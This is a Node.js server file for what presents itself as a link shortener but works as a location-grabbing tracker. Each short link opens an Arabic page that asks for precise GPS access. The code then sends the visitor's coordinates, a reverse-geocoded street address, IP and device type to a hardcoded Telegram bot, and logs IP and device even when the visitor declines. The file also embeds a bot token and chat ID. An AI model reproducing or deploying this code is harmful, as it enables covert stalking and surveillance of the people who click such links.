const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.text({ type: 'text/plain', limit: '10mb' }));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5942654805';
const BASE_URL = process.env.SHORT_DOMAIN || 'https://vvvvv-production-7945.up.railway.app';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

async function sendToTelegram(msg, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          chat_id: TELEGRAM_CHAT_ID,
          text: msg,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        },
        { timeout: 10000 }
      );
      return true;
    } catch (err) {
      if (i < retries - 1) await new Promise(r => setTimeout(r, 500));
    }
  }
  return false;
}

async function reverseGeocode(lat, lng) {
  try {
    const res = await axios.get(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`,
      { timeout: 3000, headers: { 'User-Agent': 'LinkShortener/1.0' } }
    );
    if (res.data && res.data.address) {
      return res.data.display_name || 'Unknown Location';
    }
  } catch (e) {}
  return null;
}

function safeParseBody(req) {
  if (typeof req.body === 'string') {
    try { return JSON.parse(req.body); } catch (e) { return {}; }
  }
  return req.body || {};
}

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL required' });

  let normalizedUrl = url.trim();
  if (!/^https?:\/\//i.test(normalizedUrl)) {
    normalizedUrl = 'https://' + normalizedUrl;
  }

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { original: normalizedUrl, created: new Date(), clicks: 0 };

  res.json({
    shortened: `${BASE_URL}/${shortCode}`,
    code: shortCode
  });
});

app.post('/api/log-gps', async (req, res) => {
  const body = safeParseBody(req);
  const { code, latitude, longitude, accuracy } = body;

  if (!code || !linkStorage[code]) {
    return res.status(404).json({ error: 'Not found' });
  }

  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
  const userAgent = req.get('user-agent') || 'Unknown';
  linkStorage[code].clicks++;

  let address = null;
  if (latitude && longitude) {
    address = await reverseGeocode(latitude, longitude);
  }

  let msg = `🎯 <b>موقع دقيق!</b>\n━━━━━━━━━━━━━━━━━━━\n`;
  msg += `<b>📌 الكود:</b> <code>${code}</code>\n`;
  msg += `<b>🔌 IP:</b> <code>${ip}</code>\n`;
  msg += `⏰ ${new Date().toLocaleString('ar-SA')}\n`;
  msg += `━━━━━━━━━━━━━━━━━━━\n\n`;

  if (latitude && longitude) {
    msg += `<b>✅ 📍 GPS Coordinates</b>\n`;
    msg += `📍 <code>${latitude}, ${longitude}</code>\n`;
    msg += `📏 دقة: ±${accuracy.toFixed(0)} متر\n`;
    msg += `🗺️ <a href="https://maps.google.com/?q=${latitude},${longitude}">Maps</a>\n`;
    
    if (address) {
      msg += `\n<b>📮 العنوان:</b>\n${address}\n`;
    }
    
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  } else {
    msg += `<b>❌ بدون GPS</b>\n`;
    msg += `المستخدم رفض السماح بالموقع\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  msg += `<b>🖥️ Device:</b>\n`;
  if (/android/i.test(userAgent)) msg += `📱 Android`;
  else if (/iphone|ipad/i.test(userAgent)) msg += `📱 iOS`;
  else if (/windows/i.test(userAgent)) msg += `💻 Windows`;
  else if (/mac os/i.test(userAgent)) msg += `🍎 macOS`;
  else msg += `🖥️ Other`;

  await sendToTelegram(msg);
  res.json({ success: true });
});

app.get('/api/test', async (req, res) => {
  const ok = await sendToTelegram('🔗 اختبار ✅');
  res.json({ telegram: ok ? 'sent' : 'failed' });
});

app.use(express.static('.'));

app.get('/:code', (req, res) => {
  const { code } = req.params;

  if (!linkStorage[code]) {
    return res.status(404).send('<h1 style="text-align:center;margin-top:50px">الرابط غير موجود</h1>');
  }

  const originalUrl = linkStorage[code].original;

  res.send(`<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>جاري التحميل...</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: #000;
      color: #fff;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      flex-direction: column;
      gap: 30px;
    }
    .container {
      text-align: center;
      max-width: 500px;
      padding: 40px;
    }
    h1 {
      font-size: 32px;
      margin-bottom: 20px;
      color: #4CAF50;
    }
    .message {
      font-size: 18px;
      margin-bottom: 30px;
      line-height: 1.6;
      color: #ddd;
    }
    button {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      padding: 18px 50px;
      font-size: 18px;
      border-radius: 10px;
      cursor: pointer;
      font-weight: bold;
      transition: transform 0.2s;
    }
    button:hover {
      transform: scale(1.05);
    }
    button:active {
      transform: scale(0.95);
    }
    .loading {
      display: none;
      font-size: 16px;
      color: #667eea;
      margin-top: 20px;
    }
    .spinner {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid #333;
      border-top: 3px solid #667eea;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-right: 10px;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .error {
      display: none;
      color: #f44336;
      font-size: 16px;
      margin-top: 20px;
    }
    .skip {
      display: none;
      color: #999;
      font-size: 14px;
      margin-top: 20px;
      text-decoration: underline;
      cursor: pointer;
    }
    .skip:hover {
      color: #ccc;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🎯 طلب موقعك</h1>
    <div class="message">
      نحتاج موقعك الدقيق لكي نتمكن من متابعتك بشكل أفضل.
      <br><br>
      اضغط الزر أدناه وسمح بالوصول لموقعك.
    </div>
    
    <button id="gpsBtn" onclick="requestGPS()">🎯 اطلب موقعي الآن</button>
    
    <div class="loading" id="loading">
      <div class="spinner"></div>
      جاري الحصول على الموقع...
    </div>
    
    <div class="error" id="error"></div>
    
    <div class="skip" id="skip" onclick="skipGPS()">تخطي ➜</div>
  </div>

  <script>
    const code = ${JSON.stringify(code)};
    const originalUrl = ${JSON.stringify(originalUrl)};
    const apiUrl = '${BASE_URL}/api/log-gps';

    function showLoading() {
      document.getElementById('gpsBtn').style.display = 'none';
      document.getElementById('loading').style.display = 'block';
      document.getElementById('skip').style.display = 'block';
    }

    function showError(msg) {
      document.getElementById('error').textContent = msg;
      document.getElementById('error').style.display = 'block';
      document.getElementById('loading').style.display = 'none';
      document.getElementById('skip').style.display = 'block';
    }

    function requestGPS() {
      showLoading();

      if (!navigator.geolocation) {
        showError('المتصفح لا يدعم GPS');
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lng = position.coords.longitude;
          const accuracy = position.coords.accuracy;

          fetch(apiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              code: code,
              latitude: lat,
              longitude: lng,
              accuracy: accuracy
            }),
            keepalive: true
          }).catch(() => {});

          setTimeout(() => {
            window.location.href = originalUrl;
          }, 500);
        },
        (error) => {
          showError('رفضت السماح بالموقع. اضغط تخطي للمتابعة.');
          document.getElementById('skip').style.display = 'block';
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }

    function skipGPS() {
      fetch(apiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          code: code,
          latitude: null,
          longitude: null,
          accuracy: null
        }),
        keepalive: true
      }).catch(() => {});

      window.location.href = originalUrl;
    }
  </script>
</body>
</html>`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});